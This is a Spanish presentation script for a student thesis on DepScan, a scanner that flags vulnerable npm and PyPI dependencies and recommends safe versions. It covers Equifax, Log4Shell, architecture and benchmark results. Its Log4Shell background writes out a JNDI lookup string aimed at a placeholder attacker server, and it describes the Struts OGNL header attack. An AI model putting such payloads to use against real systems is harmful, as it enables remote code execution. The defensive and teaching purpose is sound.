# Speech · Presentación DepScan

Guion para `DepScan-Presentacion.html` (20 diapositivas). Duración estimada: **15–17 minutos** más preguntas.
El texto está pensado para decirse en voz alta, no para leerse: úsalo como guía y di las ideas con tus palabras.

> Consejo general: en cada diapositiva di primero **la idea** (el título) y luego los detalles. Si te pierdes, vuelve al título.

---

## Diapositiva 1 · Portada — *DepScan* (≈ 30 s)

> Buenos días/tardes. Mi nombre es Angel Gadiel Hernández Cruz, de la Escuela Profesional de Ingeniería de Sistemas de la Universidad Privada de Tacna.
>
> Les presento **DepScan**, un sistema web que detecta las dependencias vulnerables de proyectos **npm** y **PyPI**, es decir, de proyectos en JavaScript y en Python, y que además le dice al desarrollador **cómo corregirlas**.
>
> Los tres círculos del logo son un semáforo: rojo, ámbar y verde. Es justamente la forma en la que la aplicación comunica el nivel de riesgo de un proyecto.

---

## Diapositiva 2 · El problema — *El código que no escribimos también nos puede atacar* (≈ 1 min 15 s)

> Hoy casi nadie programa desde cero. Cuando creamos un proyecto instalamos librerías, y esas librerías instalan otras librerías. A estas últimas las llamamos **dependencias transitivas**: son dependencias de nuestras dependencias, y nunca las elegimos directamente.
>
> Miren los números de la derecha. Escaneamos **OWASP NodeGoat**, un proyecto Node.js de referencia. Tiene **1091 dependencias**, y el **97 %**, 1055, son transitivas: no aparecen en el `package.json`. Es decir, si el desarrollador revisa a mano su archivo de dependencias, solo ve el 3 % de lo que realmente tiene instalado.
>
> De esas 1091, **133 son vulnerables** y **20 fallas son críticas**.
>
> El problema tiene dos partes. Primero: cuando se publica una falla en una librería, el equipo no se entera, porque nadie cruza *lo que tengo instalado* con *lo que ya se sabe que está roto*. Y segundo: aun sabiendo que hay una falla, decidir **a qué versión actualizar** sin romper el proyecto y sin caer en otra versión vulnerable es prueba y error.
>
> Estos datos no son de un artículo: son de un escaneo nuestro, en producción, sobre un commit fijo, hecho el 14 de octubre.

---

## Diapositiva 3 · Antecedentes — *No es un riesgo teórico* (≈ 2 min)

> ¿Esto ha pasado de verdad? Sí, y con consecuencias enormes.
>
> **Equifax, 2017.** Equifax es una de las tres grandes empresas de historial crediticio de Estados Unidos. Usaba **Apache Struts**, un framework web de Java, con una falla conocida: la `CVE-2017-5638`. El parche estaba disponible desde el **6 de marzo**; los atacantes entraron en **mayo**, unos dos meses después. Resultado: se expusieron los datos personales de unos **147 millones de personas**. Lo importante: no fue un ataque sofisticado ni una falla desconocida. La vulnerabilidad estaba publicada y la solución existía; simplemente **nadie actualizó el componente**.
>
> **Log4Shell, 2021.** Log4j es una librería de Java que sirve solo para escribir registros, *logs*. En diciembre de 2021 se publicó la `CVE-2021-44228`, con la severidad máxima, **10 de 10**: bastaba con que la aplicación registrara un texto enviado por el atacante para que este **ejecutara código en el servidor**. El gran problema fue que miles de organizaciones **no sabían que usaban Log4j**, porque venía como dependencia transitiva dentro de otros productos. Es exactamente el 97 % de la diapositiva anterior.
>
> **OWASP Top 10.** OWASP, la referencia mundial en seguridad de aplicaciones web, incluye "**Componentes vulnerables y desactualizados**" entre los diez riesgos principales, en la categoría **A06 de 2021**.
>
> Y abajo, lo que ya existe: las vulnerabilidades ya están publicadas gratis en **OSV**, de Google, y **NVD**, del NIST. Y hay herramientas: `npm audit`, `pip-audit`, OSV-Scanner y Snyk. Por eso nuestra tesis es que **el valor no está en los datos, sino en procesarlos bien y explicarlos**. Eso es lo que hace DepScan.

*(La explicación a fondo de estos casos está al final de este documento, en la sección "Antecedentes explicados".)*

---

## Diapositiva 4 · Objetivo — *Detectar, priorizar y decir cómo corregir* (≈ 1 min)

> El objetivo general es desarrollar un sistema web que **detecte** las dependencias vulnerables de proyectos npm y PyPI a partir de sus **versiones exactas**, las **priorice** por severidad y entregue los **pasos concretos para remediarlas**.
>
> Para lograrlo nos planteamos seis objetivos específicos:
> 1. Leer los tres archivos más comunes —`package.json`, `package-lock.json` y `requirements.txt`— y obtener la versión exacta de cada dependencia, directa y transitiva.
> 2. Consultar OSV en lote y enriquecer con el puntaje oficial CVSS de NVD.
> 3. Aplicar lógica propia: eliminar duplicados, priorizar y mostrar un semáforo.
> 4. Recomendar una versión segura **verificada contra todos los avisos** del paquete.
> 5. Ofrecerlo en web, con reportes HTML y PDF, historial, login y una herramienta de línea de comandos para integración continua.
> 6. Y algo que considero clave: **medir** los resultados contra herramientas existentes con un benchmark reproducible.

---

## Diapositiva 5 · Alcance — *Qué hace y qué no hace* (≈ 1 min)

> Es importante ser claros con los límites.
>
> **Dentro del alcance:** npm y PyPI con sus dependencias transitivas; se puede subir archivos, una carpeta, o escanear un repositorio de GitHub en un commit exacto, incluso privado si conectas tu cuenta; damos la versión recomendada, comandos, `overrides`, mitigaciones y parches; historial, comparación antes y después, reportes, y la CLI que puede **detener una entrega** si hay fallas graves.
>
> **Limitaciones declaradas:** DepScan **no descubre fallas nuevas**, solo las ya publicadas. **No sabe si el código usa la función afectada**; a eso se le llama alcanzabilidad. Sin lockfile la precisión baja, y en ese caso avisamos o estimamos, y lo marcamos como estimación. No aplica las correcciones de forma automática. Y necesita internet, aunque usamos una caché de 24 horas.

---

## Diapositiva 6 · Cómo funciona — *Un escaneo en 7 pasos* (≈ 1 min 15 s)

> Un escaneo sigue siete pasos:
> 1. **Leer:** detectamos y parseamos los manifiestos, incluyendo rangos de versión, archivos incluidos con `-r`, extras y comentarios.
> 2. **Resolver:** sacamos la versión exacta del lockfile. Esto es fundamental: el `package.json` dice "cualquier versión 4.x", pero lo vulnerable o no es una versión concreta.
> 3. **Consultar:** usamos el endpoint `querybatch` de OSV, que acepta hasta **1000 paquetes por petición**.
> 4. **Detallar:** traemos la severidad, los alias y las versiones corregidas, con caché.
> 5. **Enriquecer:** opcionalmente, el CVSS oficial de NVD.
> 6. **Analizar:** deduplicamos, separamos directas de transitivas, priorizamos y calculamos la versión segura.
> 7. **Reportar:** semáforo, web, HTML, PDF y código de salida para CI.
>
> Abajo está la división clave: **OSV y NVD aportan los datos**, descubren y publican las fallas. **DepScan aporta todo lo demás**: los parsers, la resolución de versiones, los comparadores de versiones propios, la deduplicación, la priorización, la remediación y la interfaz.

---

## Diapositiva 7 · Tecnología — *Un solo lenguaje de punta a punta: TypeScript* (≈ 45 s)

> Todo el sistema está en **TypeScript**. En el frontend, React 19 con Vite y Tailwind. En el backend, Node.js 24 con Fastify 5. El motor es una librería propia, `@depscan/core`, **sin dependencias de runtime**: algo coherente para un escáner de dependencias. La base de datos es SQLite nativo de Node. Los PDF se generan con pdfkit. La CLI usa `parseArgs` de Node. La calidad se controla con Vitest, ESLint, Prettier y GitHub Actions, con **97 pruebas**. Y se despliega con Docker en Railway.

---

## Diapositiva 8 · Decisiones — *¿Por qué esta tecnología y no otra?* (≈ 1 min 15 s)

> Cada elección tiene una razón, y están documentadas como ADR, registros de decisiones de arquitectura.
>
> - **TypeScript en todo** en lugar de Python, Java o .NET: compartimos los mismos tipos entre web, API y motor, y la restricción del curso era trabajar solo con VS Code.
> - **Fastify** en lugar de Express o NestJS: más moderno, con validación por esquemas, y mucho más ligero que NestJS.
> - **SQLite** en lugar de PostgreSQL: sin servidor de base de datos que instalar ni pagar; suficiente para historial y caché.
> - **OSV como fuente principal:** NVD tiene mala cobertura de paquetes npm y limita a 5 consultas cada 30 segundos; OSV acepta lotes de 1000.
> - **Comparadores de versiones propios** en vez de la librería `semver`: es la parte evaluable del proyecto, está probada, y además cubre **PEP 440**, el formato de versiones de Python.
> - **OAuth propio:** con solo dos proveedores no se justifica otra dependencia, y tenemos control total de la seguridad.
> - **Un solo servicio** en Railway: un dominio, sin problemas de CORS, menor costo.
> - **pdfkit** en lugar de un Chrome dentro del contenedor: imagen más liviana.

---

## Diapositiva 9 · Arquitectura — *Monorepo con arquitectura hexagonal en el motor* (≈ 1 min 15 s)

> El proyecto es un monorepo. En el centro está el **núcleo**, `packages/core`, que contiene toda la lógica: parsers, resolver, analizador, remediación, comparadores y reportes. Lo importante es que el núcleo **no conoce HTTP, ni la base de datos, ni React**.
>
> A la izquierda, las **entradas**: la web, la API, la CLI y SQLite. A la derecha, los **adaptadores externos**: OSV, NVD, los registros de npm y PyPI, y GitHub.
>
> El núcleo se comunica con el exterior a través de **puertos**, que son interfaces: `VulnSource`, `CveEnricher`, `RegistrySource` y `Cache`. Esto se llama arquitectura hexagonal o de puertos y adaptadores, y nos da dos ventajas: la web, la API y la CLI **usan el mismo motor**, y en las pruebas **simulamos las fuentes externas**, así que las 97 pruebas corren sin internet.
>
> Además usamos los patrones repositorio, estrategia por ecosistema, fachada con `scanProject` y pipeline.

---

## Diapositiva 10 · Despliegue — *De un push a producción* (≈ 45 s)

> El flujo es: el código está en GitHub; cada push a `main` dispara GitHub Actions, que ejecuta lint, tipado, las 97 pruebas y el build, y además **DepScan se escanea a sí mismo**: si encuentra una vulnerabilidad alta en nuestras propias dependencias, el build falla. Otro workflow regenera el diccionario de datos.
>
> Finalmente se despliega en Railway con una imagen Docker multietapa, SQLite en un volumen persistente, healthcheck y reinicio automático. La aplicación está **en línea** en esta dirección.

---

## Diapositiva 11 · La aplicación — *Escanear es arrastrar una carpeta o pegar un repo* (≈ 45 s)

> Esta es la pantalla de nuevo escaneo. Hay tres formas: **subir archivos o una carpeta** —y el navegador filtra solo los manifiestos, ignorando `node_modules`—; pegar la URL de un **repositorio de GitHub**, que se analiza en un commit exacto para que el resultado sea reproducible; o elegir de **mis repos de GitHub**, incluidos los privados.
>
> Hay opciones para incluir dependencias de desarrollo, estimar sin lockfile y usar el CVSS de NVD. Se puede entrar con Google o GitHub, y si escaneaste sin cuenta, el escaneo pasa a tu cuenta al iniciar sesión.

---

## Diapositiva 12 · La aplicación — *El resultado: semáforo, severidades y cada hallazgo* (≈ 45 s)

> Este es el resultado de NodeGoat. Arriba, el **semáforo** de riesgo y el conteo por severidad. Se registra la rama, el **commit**, la versión del escáner y el tiempo: **7,2 segundos para 1091 dependencias**.
>
> La tabla se filtra por severidad, directa o transitiva, ecosistema y desarrollo. Cada paquete muestra sus CVE **ya deduplicados** y la versión recomendada. Y se descarga en HTML o PDF.

---

## Diapositiva 13 · La aplicación — *No solo dice qué está mal: dice cómo arreglarlo* (≈ 1 min)

> Esta es la parte que más nos diferencia. Al abrir un hallazgo vemos:
> - La **versión recomendada**, preferiblemente dentro de la misma versión mayor para no romper nada; y si se necesita un salto mayor, se avisa.
> - **Todas las versiones seguras**, verificadas contra **todos** los avisos del paquete, no solo contra el aviso actual.
> - **Comandos listos para copiar**: `npm install`, `overrides` para dependencias transitivas —que no puedes actualizar directamente— y `pip install`.
> - Y si no se puede actualizar, **mitigaciones**: las del propio aviso y otras según el tipo de falla, su CWE, con enlaces a los parches.

---

## Diapositiva 14 · Resultados — *Benchmark: DepScan frente a npm audit* (≈ 1 min 30 s)

> Para no quedarnos en "creemos que funciona", lo **medimos**. Tomamos repositorios intencionalmente vulnerables, fijados por commit, y comparamos DepScan con `npm audit`.
>
> En NodeGoat, `npm audit` reporta 197 y DepScan 193; los 193 están en común. En nodejs-goof, 232 frente a 228, todos en común. En vulnerable-node, 5 y 5.
>
> La conclusión está abajo: **cero fallas** que encuentre `npm audit` y DepScan no. ¿Y por qué `npm audit` muestra 4 más? Porque hay avisos GHSA distintos que comparten el mismo CVE: es **la misma falla contada dos veces**. `npm audit` los repite y DepScan los une. Lo indicamos como "por confirmar a mano" porque queremos ser rigurosos.
>
> En PyPI, `npm audit` no aplica, por eso los guiones; DepScan encontró 147 hallazgos en pygoat y 55 en dvpwa.
>
> Y además, las **97 pruebas automatizadas** del motor y de la API pasan en verde.
>
> Una aclaración honesta: las bases cambian a diario, así que estos números valen para la corrida del 13 de octubre.

**Repositorios usados en el benchmark** (proyectos de código abierto hechos vulnerables a propósito para enseñar seguridad; fijados por commit en `benchmark/repos.json`):

| # | Repositorio | Ecosistema | Link (commit exacto analizado) | Qué es |
|---|---|---|---|---|
| 1 | OWASP/NodeGoat | npm | https://github.com/OWASP/NodeGoat/tree/c5cb68a7084e4ae7dcc60e6a98768720a81841e8 | Proyecto oficial de OWASP para enseñar el Top 10 en Node.js. |
| 2 | snyk-labs/nodejs-goof | npm | https://github.com/snyk-labs/nodejs-goof/tree/add14ba59e98240d9e00a235dd7d42cd61ae9912 | App de tareas vulnerable de Snyk. |
| 3 | cr0hn/vulnerable-node | npm | https://github.com/cr0hn/vulnerable-node/tree/d68f2a3c9277ece2c2feb9976052033bdecd7fbe | App Node.js vulnerable, pequeña (124 dependencias). |
| 4 | adeyosemanputra/pygoat | PyPI | https://github.com/adeyosemanputra/pygoat/tree/19d17cc8874861142b330636d068bbde54e86b85 | Versión de OWASP en Python (Django). |
| 5 | anxolerd/dvpwa | PyPI | https://github.com/anxolerd/dvpwa/tree/a1d8f89fac2e57093189853c6527c2b01fc1d9c1 | *Damn Vulnerable Python Web Application*. |

*Extra (no aparece en la diapositiva):* [fportantier/vulpy](https://github.com/fportantier/vulpy/tree/5249cc8b05a1c37f6b2f757b1cf16a509c327122) también está en el benchmark, pero dio 0 hallazgos porque sus 9 dependencias no tienen versión fija en `requirements.txt`. Sirve de ejemplo si preguntan: sin versión exacta, DepScan no inventa resultados.

---

## Diapositiva 15 · Comparación — *Frente a herramientas similares* (≈ 1 min)

> Comparando características: `npm audit` y `pip-audit` solo cubren un ecosistema cada una, son de consola y en inglés. OSV-Scanner cubre ambos y deduplica, pero no tiene interfaz web ni verifica la versión recomendada. Snyk es la más completa, pero es comercial, y el reporte PDF y varias funciones son de pago.
>
> DepScan reúne todo: npm y PyPI juntos, interfaz web, en **español**, deduplicación, versión recomendada verificada, lista de todas las versiones seguras, mitigaciones, PDF, y es **gratis**.

---

## Diapositiva 16 · Nuestra diferencia — *Lo que DepScan hace distinto* (≈ 1 min)

> Resumo nuestra diferencia en cuatro puntos:
> 1. **Remediación verificada.** Otras herramientas te dicen "actualiza a la versión corregida de este aviso", pero esa versión puede tener **otra** falla. Log4Shell es el ejemplo perfecto: la primera versión corregida, la 2.15.0, resultó vulnerable a otra falla y hubo que pasar a la 2.16 y luego a la 2.17. DepScan evalúa cada versión candidata contra todos los avisos del paquete.
> 2. **Pensado para quien aprende:** en español, con explicación y comandos.
> 3. **Honesto con sus límites:** sin lockfile no inventa versiones.
> 4. **Evidencia reproducible:** commit, fecha, versión del escáner y PDF; el benchmark se repite con un solo comando.

---

## Diapositiva 17 · Calidad y seguridad — *La propia aplicación cumple lo que predica* (≈ 1 min)

> Un escáner de seguridad tiene que ser seguro él mismo.
>
> En calidad: **97 pruebas** que corren sin internet gracias a los puertos; el CI **escanea nuestro propio código** y bloquea el build ante una falla alta; el diccionario de datos se genera automáticamente desde el esquema real; y tenemos la documentación RUP completa, de FD01 a FD06, con ADR.
>
> En seguridad: login OAuth con Google y GitHub, con los **tokens cifrados con AES-256-GCM**; cookies `HttpOnly`, `Secure` y `SameSite`, y se genera una sesión nueva tras autenticarse para evitar fijación de sesión; **límite de peticiones** por minuto; y los repos privados solo los ve su dueño.

**Si te preguntan qué significa "97 pruebas automatizadas sin internet":**
- **Prueba automatizada:** código que verifica que otra parte del programa funcione. Ejemplo: "si lodash está en `4.17.15` y el aviso afecta desde `3.7.0` hasta antes de `4.17.19`, el comparador debe decir que está afectada". Se ejecutan con `npm test` y solas en GitHub Actions en cada push.
- **Sin internet:** la app real consulta OSV, NVD, npm y PyPI, pero las pruebas no se conectan a nada. Así son **rápidas**, **confiables** (no fallan si OSV está caído) y **repetibles** (los datos de prueba no cambian, las bases reales sí).
- **Gracias a los puertos:** el motor pide los datos a través de una interfaz (`VulnSource`, `CveEnricher`, `RegistrySource` en `packages/core/src/sources/ports.ts`). En producción la cumple el cliente real de OSV; en las pruebas, una OSV simulada (`FakeOsv`, en `packages/core/test/scan.test.ts`). Es como un simulador de vuelo: mismos controles, sin avión real.
- **Dónde están:** `packages/core/test/` (motor) y `apps/api/test/` (API).

> Frase corta: "Tenemos 97 pruebas que verifican el motor y la API en cada push. No necesitan internet porque, gracias a los puertos, reemplazamos OSV, NVD y los registros por versiones simuladas con datos controlados."

---

## Diapositiva 18 · Trabajo futuro — *Hacia dónde puede crecer* (≈ 45 s)

> Hacia adelante: **más ecosistemas** como Maven, Go, Cargo, Composer y NuGet, y gracias a la arquitectura solo hacen falta nuevos parsers y comparadores. **Alcanzabilidad**, para saber si el código realmente llama a la función vulnerable. **Correcciones automáticas** vía pull request, con revisión humana. **Benchmark ampliado** con OSV-Scanner para PyPI. **Alertas** cuando se publique una falla nueva en un proyecto ya escaneado. Y exportar el inventario como **SBOM** en CycloneDX o SPDX.

---

## Diapositiva 19 · Conclusiones (≈ 1 min)

> Para cerrar:
> - Construimos y **desplegamos** un sistema que detecta dependencias vulnerables en npm y PyPI a partir de versiones exactas, incluidas las transitivas.
> - En el benchmark encontramos **todas** las fallas que reporta `npm audit`, uniendo los duplicados, sin hallazgos perdidos.
> - El aporte principal es la **remediación verificada**: una versión segura contra todos los avisos, los comandos para aplicarla y mitigaciones si no se puede actualizar.
> - La arquitectura hexagonal permitió usar el mismo motor en web, API y CLI, y probarlo sin internet.
> - Y declaramos los límites: informamos fallas **conocidas**, no la explotabilidad real.
>
> Si Equifax hubiera tenido algo que cruzara automáticamente lo instalado con lo publicado y bloqueara la entrega, esa falla de dos meses no habría pasado desapercibida. Eso es lo que automatiza DepScan.

---

## Diapositiva 20 · Gracias — *¿Preguntas?* (≈ 15 s)

> Muchas gracias por su atención. La demo está en línea en esta dirección y el código en GitHub. Quedo atento a sus preguntas.

---
---

# Antecedentes explicados (para entender y defender la diapositiva 3)

Los antecedentes sirven para demostrar que el problema **es real, es caro y sigue ocurriendo**. Cada caso justifica una función concreta de DepScan. Si te preguntan "¿y eso qué tiene que ver con tu proyecto?", la respuesta está en la línea **Relación con DepScan** de cada caso.

## 1. Equifax (2017) — el caso principal

**Qué es Equifax.** Una de las tres grandes agencias de historial crediticio de Estados Unidos: guarda nombres, números de seguro social, fechas de nacimiento, direcciones y, en algunos casos, números de licencia de conducir y tarjetas de crédito.

**Qué componente falló.** Apache Struts 2, un framework de Java para aplicaciones web. Equifax lo usaba en su portal de disputas de crédito (donde los ciudadanos reclaman errores en su historial).

**La falla: CVE-2017-5638.** Estaba en el componente que procesa la subida de archivos (el parser *Jakarta Multipart*). Un atacante podía enviar una petición HTTP con un encabezado `Content-Type` manipulado que contenía una expresión OGNL (el lenguaje de expresiones de Struts) y el servidor **la ejecutaba**. Es decir: ejecución remota de código sin necesidad de usuario ni contraseña.

**Línea de tiempo (lo que más impacta):**

| Fecha (2017) | Hecho |
|---|---|
| 6–7 de marzo | Se publica la vulnerabilidad y el parche de Apache Struts. |
| Pocos días después | Ya se ven ataques automatizados contra servidores en internet; según el informe del GAO, a Equifax empezaron a escanearla a los pocos días. |
| Marzo | Equifax recibe la alerta interna, pero la lista de responsables a notificar estaba desactualizada y el escaneo interno no encontró el sistema vulnerable. **No se parcha.** |
| 13 de mayo | Los atacantes entran por el portal de disputas. |
| Mayo – julio | Permanecen dentro unos **76 días** extrayendo datos. No se detectó antes en parte porque un certificado del sistema de monitoreo de tráfico llevaba meses vencido. |
| 29–30 de julio | Equifax detecta el tráfico sospechoso. |
| 7 de septiembre | Se anuncia públicamente la filtración. |

**Consecuencias.** Datos de unos **147 millones de personas**. Renunciaron el CEO, el CIO y el CSO, y en 2019 Equifax llegó a un acuerdo con la FTC y los estados de hasta unos 700 millones de dólares.

**La moraleja.** No fue una falla desconocida ni un ataque avanzado: **el parche existía dos meses antes**. El problema fue de inventario y de proceso: nadie cruzó *lo que tengo instalado* con *lo que se sabe que está roto*.

**Relación con DepScan.** Es exactamente lo que automatiza: inventario de dependencias con versión exacta + cruce con bases públicas + la CLI en CI con `--fail-on` que **impide desplegar** una versión con fallas críticas, sin depender de que una persona lea un correo.

> Nota: Struts es Java (Maven), un ecosistema que DepScan aún no cubre (está en trabajo futuro). Si te lo señalan, responde que el caso ilustra el **tipo de problema**, que es idéntico en npm y PyPI, y que agregar Maven solo requiere un parser y un comparador nuevos gracias a la arquitectura.

## 2. Log4Shell (2021) — el problema de las transitivas

**Qué es Log4j.** Una librería de Java para escribir *logs* (registros como "usuario X inició sesión"). Está presente en una cantidad enorme de software: servidores, productos empresariales, servicios en la nube, incluso Minecraft, donde se vieron los primeros ataques.

**La falla: CVE-2021-44228, CVSS 10.0 (el máximo).** Log4j interpretaba ciertos textos especiales dentro de lo que registraba. Si un atacante lograba que la aplicación registrara algo como `${jndi:ldap://servidor-del-atacante/x}` —por ejemplo, poniéndolo en el nombre de usuario o en el encabezado *User-Agent*—, Log4j se conectaba a ese servidor, descargaba código y **lo ejecutaba**. Bastaba con que el texto apareciera en un log.

**Por qué fue tan grave:**
1. **Facilísima de explotar:** una sola cadena de texto.
2. **Ubicua y escondida:** la mayoría de organizaciones **no sabía que la usaba**, porque venía como **dependencia transitiva** dentro de otros productos o librerías. Lo primero que tuvieron que hacer miles de empresas fue preguntarse "¿dónde tenemos Log4j?", y no tenían cómo responder rápido.
3. **La primera corrección no bastó:** la versión **2.15.0** corrigió la falla original, pero enseguida se publicó otra (CVE-2021-45046) que también la afectaba; luego hubo que pasar a la **2.16.0** y después a la **2.17.0** (y 2.17.1) por nuevas fallas relacionadas.

**Relación con DepScan.** Justifica dos funciones:
- **Resolver las transitivas** desde el lockfile: el 97 % de NodeGoat es la versión npm del "no sabía que tenía Log4j".
- **Remediación verificada** (diapositiva 16): quien actualizaba a "la versión corregida del aviso" (2.15.0) seguía vulnerable. DepScan evalúa la versión recomendada contra **todos** los avisos del paquete, justo para evitar eso.

## 3. OWASP Top 10 — A06:2021 "Componentes vulnerables y desactualizados"

**Qué es OWASP.** Open Worldwide Application Security Project, una fundación sin fines de lucro. Su **Top 10** es la lista de referencia de los riesgos más críticos en aplicaciones web, usada por empresas, auditores y universidades.

**La categoría A06:2021.** Dice que una aplicación está en riesgo si:
- No conoces las versiones de todos los componentes que usas, **incluidas las dependencias anidadas** (transitivas).
- Usas software vulnerable, sin soporte o desactualizado.
- No buscas vulnerabilidades de forma periódica.
- No actualizas a tiempo.

Entre las prevenciones que recomienda está **mantener un inventario de versiones** y **monitorear continuamente fuentes como CVE y NVD** con herramientas automatizadas.

**Relación con DepScan.** Es casi la definición del sistema: inventario de versiones exactas + consulta a OSV/NVD + integración continua. Sirve como respaldo "institucional": no es una preocupación nuestra, es una de las diez principales del sector.

> Dato extra por si preguntan: en la edición **OWASP Top 10:2025** esta categoría se amplió a "fallas en la cadena de suministro de software", lo que refuerza la relevancia del tema. (Verifícalo antes si piensas mencionarlo.)

## 4. Caso extra (está en el FD05, no en la diapositiva): event-stream (npm, 2018)

`event-stream` era un paquete npm muy usado (alrededor de 2 millones de descargas semanales). Su mantenedor original cedió el control a un desconocido, que agregó una nueva dependencia, `flatmap-stream`, con **código malicioso** escondido. Ese código se activaba solo dentro de la aplicación Copay, una billetera de bitcoin, para robar fondos. Lo importante: el código malicioso llegó **como dependencia transitiva**, sin que nadie lo instalara a propósito.

**Relación con DepScan y su límite.** Una vez publicado el aviso, DepScan lo detecta como cualquier otro. Pero **antes** de que exista el aviso no puede saberlo, porque no descubre fallas nuevas (limitación declarada en la diapositiva 5). Úsalo si te preguntan por ataques a la cadena de suministro en npm.

## 5. "Lo que ya existe" (parte inferior de la diapositiva 3)

| Recurso | Qué es | Por qué no basta |
|---|---|---|
| **OSV** (Google) | Base abierta de vulnerabilidades de código abierto; API gratuita con consultas en lote. | Son los datos, no una herramienta para el usuario final. |
| **NVD** (NIST, EE. UU.) | Base oficial de CVE con puntaje CVSS. | Mala cobertura por nombre de paquete npm y límite de 5 consultas cada 30 s. |
| `npm audit` | Viene con npm. | Solo npm, consola, en inglés, repite avisos y no verifica la versión sugerida. |
| `pip-audit` | Equivalente para Python. | Solo PyPI y de consola. |
| OSV-Scanner | CLI de Google. | Sin interfaz web, en inglés, no da versión segura verificada ni mitigaciones. |
| Snyk | Plataforma comercial. | Costo por desarrollador; plan gratuito limitado. |

**La idea para defender el proyecto:** como los datos son públicos y gratuitos, **el aporte no puede ser "consultar una API"**. El aporte es el motor propio (parsers, resolver, comparadores semver y PEP 440), la deduplicación, la remediación verificada, la interfaz en español y la medición con el benchmark. Así se evita la crítica de "esto ya existe" (que el propio planteamiento en `proyecto.md` reconoce).

---

# Preguntas probables y cómo responderlas

**"¿Esto no es solo consultar una API?"**
> No. OSV solo responde "esta versión exacta tiene estos avisos". Para llegar ahí hay que leer los manifiestos, resolver la versión exacta de más de mil dependencias, compararlas con comparadores propios de semver y PEP 440, deduplicar y, sobre todo, calcular una versión segura contra todos los avisos. Eso es lógica nuestra, probada con 97 pruebas.

**"¿Por qué `npm audit` encuentra más que ustedes?"**
> Encuentra los mismos. La diferencia de 4 son avisos GHSA que comparten el mismo CVE: es la misma falla contada dos veces. En el benchmark hay cero fallas que `npm audit` encuentre y DepScan no.

**"¿Qué pasa si el proyecto no tiene lockfile?"**
> Se avisa que la versión no se puede determinar, o, con la opción de estimar, se consulta el registro y se marca como estimación. No inventamos versiones.

**"¿Si una librería es vulnerable, mi aplicación es atacable?"**
> No necesariamente: depende de si el código usa la función afectada (alcanzabilidad). Es una limitación declarada y está en el trabajo futuro.

**"¿Por qué SQLite y no una base de datos 'de verdad'?"**
> Para este volumen (historial, usuarios, caché, una réplica) SQLite es suficiente, no requiere servidor ni costo, y está incluido en Node 24. Si el sistema escalara a varias réplicas, el repositorio está aislado y se podría cambiar a PostgreSQL.

**"¿Cómo protegen los tokens de GitHub?"**
> Se cifran con AES-256-GCM antes de guardarse; las cookies son HttpOnly, Secure y SameSite, y la sesión se regenera tras el login.

**"¿Equifax es Java, por qué lo usan si ustedes no cubren Maven?"**
> Porque ilustra el tipo de problema, que es idéntico en npm y PyPI. Agregar Maven es trabajo futuro y la arquitectura hexagonal lo hace sencillo: un parser y un comparador nuevos.
